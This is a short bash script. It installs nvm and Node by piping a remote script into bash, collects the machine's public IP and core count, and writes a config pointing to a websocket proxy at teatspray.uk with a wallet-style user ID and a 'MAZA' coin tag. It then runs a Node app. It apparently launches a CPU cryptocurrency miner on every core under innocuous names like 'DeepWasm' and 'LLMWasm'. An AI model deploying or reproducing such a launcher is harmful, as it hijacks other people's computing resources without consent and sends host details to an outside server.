#!/bin/bash
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
sleep 2

# in lieu of restarting the shell
\. "$HOME/.nvm/nvm.sh"

nvm install 23
sleep 2

nvm current
sleep 2

node -v && npm
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y-DeepWasm_')
ipaddress=$(wget -q -O - api.ipify.org)
num_of_cores=$(cat /proc/cpuinfo | grep processor | wc -l)
used_num_of_cores=`expr $num_of_cores - 0`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

cat > data.json <<-EOL
{
  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Zmx5aW5nc2F1Y2VyLWV1LnRlYXRzcHJheS51azo3MDE5",
  "config": { "threads": $used_num_of_cores, "log": true },
  "options": { "user": "MBqp1j1SARjzcy5ukYdAuriCaFX2hDpNgK", "password": "$currentdate,c=MAZA,zap=MAZA", "argent": "LLMWasm/1.0" }
}
EOL
sleep 2
node app.js
